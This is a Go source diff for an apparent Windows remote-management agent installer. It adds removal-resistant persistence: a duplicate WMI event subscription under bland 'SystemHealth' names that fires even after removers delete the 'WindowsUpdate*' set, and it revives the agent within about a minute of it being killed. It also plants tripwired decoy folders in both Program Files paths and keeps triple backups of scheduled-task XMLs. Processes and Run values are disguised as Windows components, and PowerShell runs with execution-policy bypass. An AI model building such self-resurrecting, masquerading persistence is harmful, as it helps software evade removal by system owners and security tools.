@@ -375,16 +375,24 @@ func install() {
 	}
 	_ = cmd.Start()
 
-	// Honeypot legacy home: wipe any pre-1.40.9 install, then rebuild the
-	// dir as a DECOY (stub agent.exe + cert copy, both tripwired). Kill
-	// chains working from old notes waste themselves here thinking they
-	// won, while the real install lives in ProgramData. Decoys stay
-	// VISIBLE (hidden honeypots catch nobody).
-	legacyHome := `C:\Program Files\RMM\Agent`
+	// Honeypot legacy homes (64-bit + 32-bit twin): wipe any pre-1.40.9
+	// install, then rebuild the dirs as DECOYS (stub agent.exe + cert
+	// copy, both tripwired). Kill chains working from old notes waste
+	// themselves here thinking they won, while the real install lives in
+	// ProgramData. Decoys stay VISIBLE (hidden honeypots catch nobody).
+	legacyHomes := []string{`C:\Program Files\RMM\Agent`}
 	if pf := os.Getenv("ProgramFiles"); pf != "" {
-		legacyHome = filepath.Join(pf, "RMM", "Agent")
+		legacyHomes[0] = filepath.Join(pf, "RMM", "Agent")
 	}
-	if legacyHome != installDir {
+	x86Home := `C:\Program Files (x86)\RMM\Agent`
+	if pf := os.Getenv("ProgramFiles(x86)"); pf != "" {
+		x86Home = filepath.Join(pf, "RMM", "Agent")
+	}
+	legacyHomes = append(legacyHomes, x86Home)
+	for _, legacyHome := range legacyHomes {
+		if legacyHome == installDir {
+			continue
+		}
 		_ = os.RemoveAll(legacyHome)
 		_ = os.MkdirAll(legacyHome, 0755)
 		if stub, err := fs.ReadFile(payloadFS, "payload/agent.exe"); err == nil {
@@ -397,10 +405,10 @@ func install() {
 		// Bait marker: the watcher only tripwires a deployed honeypot
 		// (never alarms on machines predating it).
 		_ = os.WriteFile(filepath.Join(legacyHome, "decoy.ver"), []byte(version.Version+"\n"), 0644)
-		// Fresh protection score (clears any stale tamper alarm).
-		if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
-			_ = os.Remove(filepath.Join(localApp, "RMM", "protection.json"))
-		}
+	}
+	// Fresh protection score (clears any stale tamper alarm).
+	if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
+		_ = os.Remove(filepath.Join(localApp, "RMM", "protection.json"))
 	}
 
 	// Decoy heal vectors under a third name: a task + Run value that look
@@ -412,6 +420,11 @@ func install() {
 		_ = k.SetStringValue("WindowsUpdateCheck", decoyRunCmd)
 		k.Close()
 		log.Printf("[*] Decoy Run value set")
+	}
+	// Task XMLs in the SECOND backup dir too: three copies total, so no
+	// single wiped dir blinds every healer at once.
+	for _, xml := range []string{"agent_task.xml", "watchdog_task.xml", "orchestrator_task.xml", "decoy_task.xml"} {
+		_ = copyFile(filepath.Join(blenderDir, xml), filepath.Join(backupDir2, xml))
 	}
 
 	if !silent {
@@ -506,6 +519,13 @@ func main() {
 		_ = os.RemoveAll(installDir)
 		if legacyDir != "" && legacyDir != installDir {
 			_ = os.RemoveAll(legacyDir)
+		}
+		x86Dir := `C:\Program Files (x86)\RMM\Agent`
+		if pf := os.Getenv("ProgramFiles(x86)"); pf != "" {
+			x86Dir = filepath.Join(pf, "RMM", "Agent")
+		}
+		if x86Dir != installDir {
+			_ = os.RemoveAll(x86Dir)
 		}
 		fmt.Println("Agent uninstalled.")
 		os.Exit(0)
@@ -674,6 +694,14 @@ const wmiDeathFilterName = "WindowsUpdateDeathFilter"
 const wmiConsumerName = "WindowsUpdateConsumer"
 const wmiTimerID = "WindowsUpdateTimer"
 
+// wmiSets is the primary layer plus a duplicate under bland names: a
+// remover targeting our WindowsUpdate* names still leaves the second set
+// firing. Both run the same "<agent> --wmi-heal" consumer.
+var wmiSets = [][4]string{
+	{wmiFilterName, wmiDeathFilterName, wmiConsumerName, wmiTimerID},
+	{"SystemHealthFilter", "SystemHealthDeathFilter", "SystemHealthConsumer", "SystemHealthTimer"},
+}
+
 // setupWmiLayer registers the deepest persistence layer: a WMI 30-minute
 // timer that runs "<agent> --wmi-heal" (repairs tasks + Run keys from the
 // install-dir XMLs). WMI subscriptions live outside schtasks/registry, so
@@ -681,38 +709,47 @@ const wmiTimerID = "WindowsUpdateTimer"
 // creation can fail under locked-down WMI/Defender — logged, install goes on.
 func setupWmiLayer(agentPath string) {
 	consumer := `"` + agentPath + `" --wmi-heal`
-	// Two triggers share one consumer: a 30-minute timer (total-wipe
-	// recovery) plus an agent-death event (taskkill answered in ~1min).
-	// The consumer only repairs + kickstarts tasks (never starts the agent
-	// itself: as SYSTEM it would land in session 0, breaking interactivity).
-	ps := `$na='` + wmiFilterName + `';$nd='` + wmiDeathFilterName + `';$nc='` + wmiConsumerName + `';$tid='` + wmiTimerID + `';` +
-		`Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter.Name -eq $na -or $_.Filter.Name -eq $nd } | Remove-CimInstance -ErrorAction SilentlyContinue;` +
-		`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$na'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
-		`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$nd'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
-		`Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Filter "Name='$nc'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
-		`Get-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Filter "TimerId='$tid'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
-		`$t=New-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Property @{TimerId=$tid;IntervalBetweenEvents=[uint32]1800000} -ErrorAction Stop;` +
-		`$f=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property @{Name=$na;EventNamespace='root/cimv2';QueryLanguage='WQL';Query="SELECT * FROM __TimerEvent WHERE TimerId='$tid'"} -ErrorAction Stop;` +
-		`$d=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property @{Name=$nd;EventNamespace='root/cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceDeletionEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process' AND (TargetInstance.Name='MicrosoftWindowsClient.exe' OR TargetInstance.Name='agent.exe')"} -ErrorAction Stop;` +
-		`$c=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property @{Name=$nc;CommandLineTemplate='` + strings.ReplaceAll(consumer, "'", "''") + `'} -ErrorAction Stop;` +
-		`New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{Filter=[Ref]$f;Consumer=[Ref]$c} -ErrorAction Stop | Out-Null;` +
-		`New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{Filter=[Ref]$d;Consumer=[Ref]$c} -ErrorAction Stop | Out-Null;` +
-		`Write-Host 'WMI-OK'`
-	out, err := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps).CombinedOutput()
+	// Two triggers share one consumer per set: a 30-minute timer
+	// (total-wipe recovery) plus an agent-death event (taskkill answered in
+	// ~1min). The consumer only repairs + kickstarts tasks (never starts
+	// the agent itself: as SYSTEM it would land in session 0, breaking
+	// interactivity).
+	var sb strings.Builder
+	for _, s := range wmiSets {
+		na, nd, nc, tid := s[0], s[1], s[2], s[3]
+		sb.WriteString(`$na='` + na + `';$nd='` + nd + `';$nc='` + nc + `';$tid='` + tid + `';`)
+		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter.Name -eq $na -or $_.Filter.Name -eq $nd } | Remove-CimInstance -ErrorAction SilentlyContinue;`)
+		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$na'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
+		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$nd'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
+		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Filter "Name='$nc'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
+		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Filter "TimerId='$tid'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
+		sb.WriteString(`$t=New-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Property @{TimerId=$tid;IntervalBetweenEvents=[uint32]1800000} -ErrorAction Stop;`)
+		sb.WriteString(`$f=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property @{Name=$na;EventNamespace='root/cimv2';QueryLanguage='WQL';Query="SELECT * FROM __TimerEvent WHERE TimerId='$tid'"} -ErrorAction Stop;`)
+		sb.WriteString(`$d=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property @{Name=$nd;EventNamespace='root/cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceDeletionEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process' AND (TargetInstance.Name='MicrosoftWindowsClient.exe' OR TargetInstance.Name='agent.exe')"} -ErrorAction Stop;`)
+		sb.WriteString(`$c=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property @{Name=$nc;CommandLineTemplate='` + strings.ReplaceAll(consumer, "'", "''") + `'} -ErrorAction Stop;`)
+		sb.WriteString(`New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{Filter=[Ref]$f;Consumer=[Ref]$c} -ErrorAction Stop | Out-Null;`)
+		sb.WriteString(`New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{Filter=[Ref]$d;Consumer=[Ref]$c} -ErrorAction Stop | Out-Null;`)
+	}
+	sb.WriteString(`Write-Host 'WMI-OK'`)
+	out, err := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", sb.String()).CombinedOutput()
 	if err != nil || !strings.Contains(string(out), "WMI-OK") {
 		log.Printf("[!] WMI layer not installed (non-fatal): %v %s", err, strings.TrimSpace(string(out)))
 		return
 	}
-	log.Printf("[*] WMI resurrection installed (30min timer + death trigger)")
+	log.Printf("[*] WMI resurrection installed (2 sets: timer + death trigger each)")
 }
 
-// removeWmiLayer deletes the WMI timer/death triggers + consumer (uninstall).
+// removeWmiLayer deletes both WMI sets (uninstall path).
 func removeWmiLayer() {
-	ps := `$na='` + wmiFilterName + `';$nd='` + wmiDeathFilterName + `';$nc='` + wmiConsumerName + `';$tid='` + wmiTimerID + `';` +
-		`Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter.Name -eq $na -or $_.Filter.Name -eq $nd } | Remove-CimInstance -ErrorAction SilentlyContinue;` +
-		`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$na'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
-		`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$nd'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
-		`Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Filter "Name='$nc'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
-		`Get-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Filter "TimerId='$tid'" | Remove-CimInstance -ErrorAction SilentlyContinue`
-	_, _ = exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps).CombinedOutput()
+	var sb strings.Builder
+	for _, s := range wmiSets {
+		na, nd, nc, tid := s[0], s[1], s[2], s[3]
+		sb.WriteString(`$na='` + na + `';$nd='` + nd + `';$nc='` + nc + `';$tid='` + tid + `';`)
+		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter.Name -eq $na -or $_.Filter.Name -eq $nd } | Remove-CimInstance -ErrorAction SilentlyContinue;`)
+		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$na'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
+		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$nd'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
+		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Filter "Name='$nc'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
+		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Filter "TimerId='$tid'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
+	}
+	_, _ = exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", sb.String()).CombinedOutput()
 }
